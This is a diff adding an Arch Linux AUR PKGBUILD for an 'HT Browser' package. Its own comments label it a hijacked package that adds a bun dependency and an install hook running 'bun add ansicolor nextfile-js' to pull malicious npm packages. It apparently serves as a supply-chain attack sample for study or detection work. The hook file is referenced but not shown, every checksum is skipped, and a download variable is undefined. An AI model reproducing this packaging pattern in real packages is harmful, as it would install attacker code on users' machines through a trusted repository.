@@ -1,0 +1,38 @@
+# Maintainer: zxp19821005 <annikkitikkanen@gmail.com>
+# hijacked AUR package - nextfile-js obfuscated campaign style
+# Adds bun dependency and malicious install hook that runs
+# "bun add ansicolor nextfile-js" to pull malicious npm packages.
+
+pkgname=htbrowser-bin
+pkgver=5.0.2.21
+pkgrel=4
+pkgdesc="HT Browser - Haitai Browser for Linux"
+arch=('aarch64' 'x86_64')
+url="https://www.haitaibrowser.com"
+license=('LicenseRef-custom')
+provides=("${pkgname%-bin}=${pkgver}")
+conflicts=("${pkgname%-bin}")
+depends=(
+    'bun'
+    'nss'
+    'gtk2'
+    'hicolor-icon-theme'
+)
+options=(
+)
+source_aarch64=("${pkgname%-bin}-${pkgver}-aarch64.deb::${_downurl}/${pkgname%-bin}_l_arm_uos_${pkgver}.deb")
+source_x86_64=("${pkgname%-bin}-${pkgver}-x86_64.deb::${_downurl}/${pkgname%-bin}_l_x86_uos_${pkgver}.deb")
+install=htbrowser-bin-deps.install
+source=(
+    "LICENSE"
+    "${pkgname%-bin}.sh"
+)
+sha256sums=('SKIP'
+            'SKIP')
+sha256sums_aarch64=('SKIP')
+sha256sums_x86_64=('SKIP')
+
+package() {
+    cd "${srcdir}"
+    install -Dm755 "${pkgname%-bin}.sh" "${pkgdir}/usr/bin/${pkgname%-bin}"
+}
